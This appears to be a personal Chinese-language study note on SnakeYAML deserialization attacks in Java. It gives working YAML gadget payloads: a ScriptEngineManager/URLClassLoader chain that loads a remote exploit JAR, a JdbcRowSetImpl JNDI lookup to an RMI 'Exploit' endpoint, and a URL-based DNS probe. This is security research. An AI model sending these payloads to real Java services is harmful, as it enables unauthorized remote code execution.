---
title: snakeyaml反序列化
tags:
  - java
  - todo
description: 
---

https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/#SnakeYaml%E7%AE%80%E4%BB%8B

## dump、load
 `Yaml.dump`, `Yaml.load` 对应序列化反序列化，把java对象变成yaml格式

对于非public属性，dump会调用对应的getter，load会调用对应setter
public属性直接反射设置

load时会反射调用类的无参构造函数，加载类时会触发static代码块

## 语法

基础yaml语法：
```yaml
none: null  
bool: true  
int: 42  
float: 3.14  
map:  
key: value  
  
list:  # 也可以用 list: [item1, item2]
- item1  
- item2  
  
objectList:  
- name: tom  
age: 18  
- name: jerry  
age: 20  
  
inlineList: [a, b, c]  
inlineMap: {host: localhost, port: 3306}  
  
multiLine: |
  line1
  line2
```

`!!` 标签

将反序列化结果（Map）映射到某个类上，返回一个对应的对象

```yaml
!!User  
name: mekrina  
email: abc@abc.com  
password: testtest
```

`[]` 指定初始化参数

不止可以使用无参构造函数创建对象，也可以用`[]`指定参数

```yaml
!!java.net.URLClassLoader [[
  !!java.net.URL ["http://localhost:8888/exp.jar"]
]]
```

会调用`URL(String.class)`方法创建URL对象，然后调用`URLClassLoader(URL[] urls)`创建URLClassLoader，外面一层`[`是指定参数，里面一层是表示列表

## ScriptEngineManager SPI

```yaml
!!javax.script.ScriptEngineManager [  
  !!java.net.URLClassLoader [[  
    !!java.net.URL ["http://127.0.0.1:8888/exp.jar"]  
  ]]  
]
```

ScriptEngineManager在初始化时，会根据传入的classLoader去对应的jar中找`ScriptEngineFactory`的实现类。

这个SPI Jar结构如下，用mvn打包
```txt
src
└── main
    ├── java
    │   └── demo
    │       ├── MyScriptEngine.java
    │       └── MyScriptEngineFactory.java
    └── resources
        └── META-INF
            └── services
                └── javax.script.ScriptEngineFactory
```

javax.script.ScriptEngineFactory文件里面写`demo.MyScriptEngineFactory`

```txt
at java.util.ServiceLoader$LazyClassPathLookupIterator.nextProviderClass(ServiceLoader.java:1206)
at java.util.ServiceLoader$LazyClassPathLookupIterator.hasNextService(ServiceLoader.java:1221)
at java.util.ServiceLoader$LazyClassPathLookupIterator.hasNext(ServiceLoader.java:1265)
at java.util.ServiceLoader$2.hasNext(ServiceLoader.java:1300)
at java.util.ServiceLoader$3.hasNext(ServiceLoader.java:1385)
at javax.script.ScriptEngineManager.initEngines(ScriptEngineManager.java:123)
at javax.script.ScriptEngineManager.init(ScriptEngineManager.java:87)
at javax.script.ScriptEngineManager.<init>(ScriptEngineManager.java:75)
at Test.main(Test.java:14)
```

parse中打开URL JAR，并获取services下的对应文件，获取其中的类名，然后用Class.forName加载类，这里initialize=false

![](assets/snakeyaml/Pasted%20image%2020260629152157.png)

![](assets/snakeyaml/Pasted%20image%2020260629151804.png)

后续会获取构造函数并实例化。

## JdbcRowSetImpl

JNDI

```yaml
!!com.sun.rowset.JdbcRowSetImpl  
  dataSourceName: "rmi://localhost:11099/Exploit"  
  autoCommit: true
```

## 其他
todo...

spring、xbean、C3P0、commons-configuration的JNDI

C3P0二次反序列化

## 漏洞探测
URL作为键，生成hashMap，执行URL.equals，触发dns解析
```yaml
!!java.net.URL ["http://hey.r.mekrina.tech/"]: 1
```
